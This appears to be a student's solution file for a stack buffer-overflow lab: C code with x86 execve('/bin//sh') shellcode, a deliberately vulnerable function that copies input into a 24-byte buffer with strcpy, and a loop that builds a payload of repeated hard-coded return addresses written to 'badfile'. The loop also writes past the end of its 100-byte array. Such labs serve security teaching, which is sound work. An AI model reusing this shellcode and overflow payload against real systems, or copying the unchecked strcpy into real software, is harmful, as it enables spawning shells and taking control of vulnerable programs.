/* stack-cp1.c */

/* This program has a buffer overflow vulnerability. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[] =
  "\x31\xc0"             /* xorl    %eax,%eax              */
  "\x50"                 /* pushl   %eax                   */
  "\x68""//sh"           /* pushl   $0x68732f2f            */
  "\x68""/bin"           /* pushl   $0x6e69622f            */
  "\x89\xe3"             /* movl    %esp,%ebx              */
  "\x50"                 /* pushl   %eax                   */
  "\x53"                 /* pushl   %ebx                   */
  "\x89\xe1"             /* movl    %esp,%ecx              */
  "\x99"                 /* cdq                            */
  "\xb0\x0b"             /* movb    $0x0b,%al              */
  "\xcd\x80"             /* int     $0x80                  */
;

int bof(char *str)
{
    char buffer[24];
    printf("Address of buffer: %p\n", (void *)buffer);

    strcpy(buffer, str);

    return 1;
}


int main(int argc, char **argv)
{
    char b[100];
    FILE *badfile;

    printf("Address of code: %p\n", (void *)code);
    
    /* You need to fill the array b with appropriate contents here */
    /* Code HERE */
	int i;
    for(i = 0; i < 101; i += 4){

        /*long addr = 0x2c;
	long addr1 = 0xa0;
	long addr2 = 0x04;
	long addr3 = 0x08;
        long *ptr = (long *)(b + i);
	long *ptr1 = (long *)(b + i+1);
	long *ptr2 = (long *)(b + i+2);
	long *ptr3 = (long *)(b + i+3);
        *ptr = addr;
	*ptr1 = addr1;
	*ptr2 = addr2;
	*ptr3 = addr3;*/
b[i] = 0x2c;
b[i+1] = 0xa0;
b[i+2] = 0x04;
b[i+3] = 0x08;
    }
    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    // Hint: the second argument may not be 100
    fwrite(b, 100, 1, badfile); 
    fclose(badfile);
    
    /* Read the contents from the file "badfile" */
    char str[100];
    badfile = fopen("badfile", "r");
    // Hint: the second argument may not be 100
    fread(str, sizeof(char), 100, badfile); 
    
    bof(str);

    printf("Returned Properly\n");
    return 1;
}
